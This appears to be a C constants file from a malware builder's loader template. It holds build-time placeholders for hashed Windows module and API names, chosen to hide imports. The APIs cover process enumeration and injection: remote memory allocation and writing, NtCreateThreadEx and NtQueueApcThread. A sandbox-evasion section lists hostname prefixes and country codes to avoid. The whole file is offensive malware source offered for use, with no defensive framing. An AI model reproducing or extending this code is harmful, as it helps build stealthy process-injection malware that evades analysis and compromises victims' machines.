#include "definitions.h"

// Hashes for module names
const ObjHash NTDLL_HASH = %MODHASH__ntdll.dll%;
const ObjHash USER32_HASH = %MODHASH__user32.dll%;
const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;

// Hash for the target process name
const ObjHash TARGET_PROCESS_NAME_HASH = %FCTHASH__target_process%;

// Hashes for function names
const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
const ObjHash PROC32_FIRST_HASH = %FCTHASH__Process32First%;
const ObjHash PROC32_NEXT_HASH = %FCTHASH__Process32Next%;
const ObjHash THREAD32_FIRST_HASH = %FCTHASH__Thread32First%;
const ObjHash THREAD32_NEXT_HASH = %FCTHASH__Thread32Next%;
const ObjHash OPEN_THREAD_HASH = %FCTHASH__OpenThread%;
const ObjHash OPEN_PROCESS_HASH = %FCTHASH__OpenProcess%;
const ObjHash CLOSE_HANDLE_HASH = %FCTHASH__CloseHandle%;
const ObjHash CREATE_TOOLHELP32_SNAPSHOT_HASH = %FCTHASH__CreateToolhelp32Snapshot%;

// Hashes for system information functions
const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
const ObjHash GET_KEYBOARD_LAYOUT_HASH = %FCTHASH__GetKeyboardLayout%;
const ObjHash GLOBAL_MEMORY_STATUS_HASH = %FCTHASH__GlobalMemoryStatusEx%;

// Hashes for language and locale functions
const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%;
const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;

// Hashes for memory and thread management functions
const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__NtAllocateVirtualMemory%;
const ObjHash WRITE_MEMORY_HASH = %FCTHASH__NtWriteVirtualMemory%;
const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__NtProtectVirtualMemory%;
const ObjHash CREATE_THREAD_HASH = %FCTHASH__NtCreateThreadEx%;
const ObjHash QUEUE_APC_THREAD_HASH = %FCTHASH__NtQueueApcThread%;
const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH = %FCTHASH__NtWaitForSingleObject%;

// Hashes for sandbox detection
const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
    %SANDBOX__AVOID_HOSTNAME%
};

// List of country codes to avoid
const uint16_t AVOIDED_COUNTRIES[] = {
    %SANDBOX__AVOID_COUNTRIES%
};

// Sizes of the avoided hostname and country arrays
const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE = sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]);
const size_t AVOIDED_COUNTRIES_SIZE = sizeof(AVOIDED_COUNTRIES) / sizeof(AVOIDED_COUNTRIES[0]);